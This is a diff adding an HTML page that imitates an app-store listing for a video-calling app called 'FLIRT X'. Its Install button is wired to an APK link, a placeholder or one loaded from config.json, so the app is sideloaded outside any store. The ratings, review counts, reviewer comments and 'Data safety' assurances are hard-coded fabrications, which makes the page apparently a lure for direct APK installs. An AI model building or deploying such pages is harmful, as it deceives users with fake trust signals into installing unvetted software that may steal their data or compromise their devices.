@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FLIRT X</title>
+
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:Arial,sans-serif;color:#202124;background:#fff}
+.page{max-width:700px;margin:auto;padding:0 16px 50px}
+
+.top{height:60px;display:flex;justify-content:space-between;
+align-items:center;font-size:28px}
+
+.app{display:flex;gap:16px;align-items:center;margin:18px 0}
+
+.logo{
+width:105px;height:105px;border-radius:23px;
+object-fit:cover;background:#eee
+}
+
+h1{font-size:28px;margin:0 0 7px}
+.dev{color:#1967d2;font-size:16px}
+.muted{color:#777;font-size:14px}
+
+.stats{
+display:grid;
+grid-template-columns:repeat(4,1fr);
+text-align:center;
+margin:28px 0
+}
+
+.stat{border-right:1px solid #ddd}
+.stat:last-child{border:0}
+.stat b{display:block;font-size:20px;margin-bottom:7px}
+.stat span{font-size:13px;color:#777}
+
+.install{
+display:block;
+text-align:center;
+text-decoration:none;
+color:#fff;
+background:#1769d1;
+padding:15px;
+border-radius:28px;
+font-size:18px;
+font-weight:bold;
+margin:10px 0 30px
+}
+
+.shots{
+display:flex;
+gap:14px;
+overflow-x:auto;
+scrollbar-width:none
+}
+
+.shots::-webkit-scrollbar{display:none}
+
+.shots img{
+width:205px;
+height:380px;
+object-fit:cover;
+border-radius:10px;
+flex:none;
+background:#eee
+}
+
+section{margin-top:40px}
+
+.title{
+font-size:25px;
+font-weight:600;
+margin-bottom:18px
+}
+
+.desc{
+color:#666;
+font-size:17px;
+line-height:1.55
+}
+
+.card{
+border:1px solid #ddd;
+border-radius:15px;
+padding:22px
+}
+
+.safe{
+display:flex;
+gap:15px;
+margin-bottom:22px
+}
+
+.safe b{display:block;margin-bottom:6px}
+
+.safe p{
+margin:0;
+color:#777;
+line-height:1.45
+}
+
+.details{
+color:#1969d1;
+font-weight:bold
+}
+
+.rating{
+display:flex;
+gap:30px;
+align-items:center
+}
+
+.big{font-size:65px}
+
+.stars{
+color:#1769d1
+}
+
+.bars{flex:1}
+
+.row{
+display:flex;
+gap:7px;
+align-items:center;
+margin:7px 0
+}
+
+.bar{
+height:8px;
+background:#eee;
+border-radius:10px;
+flex:1
+}
+
+.fill{
+height:100%;
+background:#1769d1;
+border-radius:10px
+}
+
+.review{margin-top:32px}
+
+.user{
+display:flex;
+gap:12px;
+align-items:center
+}
+
+.avatar{
+width:45px;
+height:45px;
+border-radius:50%;
+background:#1769d1;
+color:white;
+display:flex;
+align-items:center;
+justify-content:center;
+font-weight:bold
+}
+
+.review p{
+color:#666;
+line-height:1.5
+}
+
+@media(max-width:450px){
+.stats b{font-size:18px}
+.stats span{font-size:12px}
+.shots img{width:190px;height:350px}
+}
+</style>
+</head>
+
+<body>
+
+<div class="page">
+
+<div class="top">
+<span>‹</span>
+<span>⌕ &nbsp;⋮</span>
+</div>
+
+<!-- APP HEADER -->
+<div class="app">
+
+<img class="logo" src="logo.png" alt="FLIRT X">
+
+<div>
+<h1>FLIRT X</h1>
+<div class="dev">FLIRT X Entertainment</div>
+<div class="muted">In-app purchases</div>
+</div>
+
+</div>
+
+<!-- STATS -->
+<div class="stats">
+
+<div class="stat">
+<b>4.8 ★</b>
+<span>12K reviews</span>
+</div>
+
+<div class="stat">
+<b>★</b>
+<span>Social</span>
+</div>
+
+<div class="stat">
+<b>18 MB</b>
+<span>Size</span>
+</div>
+
+<div class="stat">
+<b>1L+</b>
+<span>Downloads</span>
+</div>
+
+</div>
+
+<!-- DOWNLOAD -->
+<a id="download" class="install" href="#" target="_blank">
+Install
+</a>
+
+<!-- SCREENSHOTS -->
+<div class="shots">
+
+<img src="screen1.jpg" alt="FLIRT X">
+<img src="screen2.jpg" alt="FLIRT X">
+<img src="screen3.jpg" alt="FLIRT X">
+
+</div>
+
+<!-- ABOUT -->
+<section>
+
+<div class="title">
+About this app →
+</div>
+
+<p class="desc">
+FLIRT X is a social video calling application
+that helps you connect, chat and enjoy video
+conversations with people.
+</p>
+
+</section>
+
+<!-- DATA SAFETY -->
+<section>
+
+<div class="title">
+Data safety →
+</div>
+
+<div class="card">
+
+<div class="safe">
+<div>⌯</div>
+<div>
+<b>Data is encrypted in transit</b>
+<p>Your data is protected while being transferred.</p>
+</div>
+</div>
+
+<div class="safe">
+<div>☁</div>
+<div>
+<b>This app may collect data</b>
+<p>App activity and device information may be collected.</p>
+</div>
+</div>
+
+<div class="safe">
+<div>♙</div>
+<div>
+<b>Account deletion available</b>
+<p>You can request deletion of your account.</p>
+</div>
+</div>
+
+<div class="details">
+See details
+</div>
+
+</div>
+
+</section>
+
+<!-- RATINGS -->
+<section>
+
+<div class="title">
+Ratings and reviews →
+</div>
+
+<div class="rating">
+
+<div>
+<div class="big">4.8</div>
+<div class="stars">★★★★★</div>
+<div class="muted">12K reviews</div>
+</div>
+
+<div class="bars">
+
+<div class="row">
+5
+<div class="bar">
+<div class="fill" style="width:85%"></div>
+</div>
+</div>
+
+<div class="row">
+4
+<div class="bar">
+<div class="fill" style="width:15%"></div>
+</div>
+</div>
+
+<div class="row">
+3
+<div class="bar">
+<div class="fill" style="width:5%"></div>
+</div>
+</div>
+
+<div class="row">
+2
+<div class="bar">
+<div class="fill" style="width:3%"></div>
+</div>
+</div>
+
+<div class="row">
+1
+<div class="bar">
+<div class="fill" style="width:2%"></div>
+</div>
+</div>
+
+</div>
+</div>
+
+<!-- REVIEWS -->
+
+<div class="review">
+
+<div class="user">
+<div class="avatar">A</div>
+<b>Aman</b>
+</div>
+
+<div class="stars">★★★★★</div>
+
+<p>
+FLIRT X is very easy to use. Video calls are smooth
+and the interface is simple.
+</p>
+
+</div>
+
+<div class="review">
+
+<div class="user">
+<div class="avatar">R</div>
+<b>Rahul</b>
+</div>
+
+<div class="stars">★★★★☆</div>
+
+<p>
+Nice experience and clean interface. The video calling
+feature works really well.
+</p>
+
+</div>
+
+</section>
+
+</div>
+
+<script>
+
+/*
+   DOWNLOAD LINK
+
+   config.json se link automatically load hoga.
+*/
+
+const defaultLink = "https://example.com/your-app.apk";
+
+document.getElementById("download").href = defaultLink;
+
+fetch("config.json?v=" + Date.now())
+.then(response => response.json())
+.then(data => {
+
+if(data.downloadUrl){
+document.getElementById("download").href =
+data.downloadUrl;
+}
+
+})
+.catch(error => {
+
+console.log("Using default download link");
+
+});
+
+</script>
+
+</body>
+</html>
